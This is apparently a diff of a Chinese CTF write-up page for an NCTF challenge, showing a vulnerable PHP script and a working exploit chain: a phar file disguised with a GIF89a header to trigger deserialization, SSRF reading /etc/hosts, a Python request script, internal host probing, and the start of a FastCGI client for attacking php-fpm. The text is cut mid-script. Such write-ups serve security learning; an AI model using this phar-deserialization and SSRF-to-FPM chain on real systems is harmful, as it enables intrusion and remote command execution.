@@ -469,26 +469,415 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <a id="more"></a>
 
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class Easytest{
+    protected $test;
+    public function funny_get(){
+        return $this-&gt;test;
+    }
+}
+class Main {
+    public $url;
+    public function curl($url){
+        $ch = curl_init();  
+        curl_setopt($ch,CURLOPT_URL,$url);
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+        $output=curl_exec($ch);
+        curl_close($ch);
+        return $output;
+    }
 
+    public function __destruct(){
+        $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);
+        if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){
+            echo $this-&gt;curl($this-&gt;url);
+        }
+    }    
+}
+
+if(isset($_POST[&quot;submit&quot;])) {
+    $check = getimagesize($_POST[&#39;name&#39;]);
+    if($check !== false) {
+        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
+    } else {
+        echo &quot;File is not an image.&quot;;
+    }
+}
+?&gt;</code></pre>
 <p>Main类里的<code>__destruct()</code>居然存在反序列化，很有意思。然后如果绕过这个点将执行一段<code>curl</code>，这又是ssrf的点了。但是我们又要绕过<code>getimagesize</code>的检查，这就得利用到phar反序列化了，因为phar能绕过绝大部分文件的检查。<br>既然如此先ssrf读文件<br>那么构造exp:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test=<span class="string">"1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"file:///etc/hosts"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> (urlencode(serialize($a)));<span class="comment">#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</span></span><br></pre></td></tr></table></figure>
-<p>生成的phar文件改后缀为gif,jpeg，可以绕过上传。而打印出的用于触发ssrf的魔术方法的反序列化数据则传到url中。之后再用<code>phar://</code>伪协议触发。这样我们就直接写出用于触发phar反序列化的exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D'</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'phar://uploads/d388a7ce2d.gif'</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
 
-<p>接下来就是ssrf利用了，此处依旧是打内网。探测完</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">173.0.168.9	osrc</span><br></pre></td></tr></table></figure>
+class Easytest{
+    protected $test=&quot;1&quot;;
+    public function funny_get(){
+        return $this-&gt;test;
+    }
+}
+
+class Main {
+    public $url=&quot;file:///etc/hosts&quot;;
+    public function curl($url){
+        $ch = curl_init();
+        curl_setopt($ch,CURLOPT_URL,$url);
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+        $output=curl_exec($ch);
+        curl_close($ch);
+        return $output;
+    }
+
+    public function __destruct(){
+        $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);
+        if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){
+            echo $this-&gt;curl($this-&gt;url);
+        }
+    }
+}
+
+@unlink(&#39;phar.phar&#39;);
+$p = new Phar(&#39;phar.phar&#39;, 0);
+$p-&gt;startBuffering();
+$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+$o = new Main();
+$p-&gt;setMetadata($o);
+$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);
+$p-&gt;stopBuffering();
+
+
+$a = new Easytest();
+echo (urlencode(serialize($a)));#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</code></pre>
+<p>生成的phar文件改后缀为gif,jpeg，可以绕过上传。而打印出的用于触发ssrf的魔术方法的反序列化数据则传到url中。之后再用<code>phar://</code>伪协议触发。这样我们就直接写出用于触发phar反序列化的exp:</p>
+<pre><code class="python">import requests
+
+url=&#39;http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D&#39;
+
+data={
+    &#39;name&#39;:&#39;phar://uploads/d388a7ce2d.gif&#39;,
+    &#39;submit&#39;:&#39;1&#39;
+}
+
+r=requests.post(url,data=data)
+print(r.text)</code></pre>
+<p>接下来就是ssrf利用了，此处依旧是打内网。探测完<br><code>etc/hosts/</code>结果是</p>
+<pre><code class="bash">::1    localhost ip6-localhost ip6-loopback
+fe00::0    ip6-localnet
+ff00::0    ip6-mcastprefix
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+173.0.168.9    osrc</code></pre>
 <p>此时顺着主机探测<code>http://173.0.168.10</code>，可以发现有回显<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="存活主机"><br>php-FPM要怎么利用呢？这里要提到p牛的文章：<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
 <p>具体p牛写的很详细,我们知道的，就是可以直接拿脚本利用这点，使用gopher协议传输tcp数据攻击内网，达到任意命令执行。<br>使用如下脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span 